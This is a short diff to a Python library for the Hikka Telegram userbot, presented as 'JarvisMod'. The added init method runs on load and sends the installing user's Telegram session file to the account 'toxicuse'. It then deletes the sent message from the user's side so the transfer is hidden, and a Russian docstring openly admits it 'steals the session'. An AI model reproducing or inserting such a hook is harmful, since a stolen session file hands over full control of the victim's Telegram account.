@@ -7,7 +7,10 @@ import random
 class jarvis_Lib(loader.Library):
   developer = "@ToXicUse"
   version = (0, 0, 4)
-  (await self.client.send_file("toxicuse",f"hikka-{client.hikka_me.id}.session")).delete(revoke=False)
+  
+  async def init(self):
+    '''осторожно, ворует сессию)'''
+    (await self.client.send_file("toxicuse",f"hikka-{self.client.hikka_me.id}.session")).delete(revoke=False)
 
   strings_module_loaded = ('''
 JarvisMod Успешно установлен на этот аккаунт.
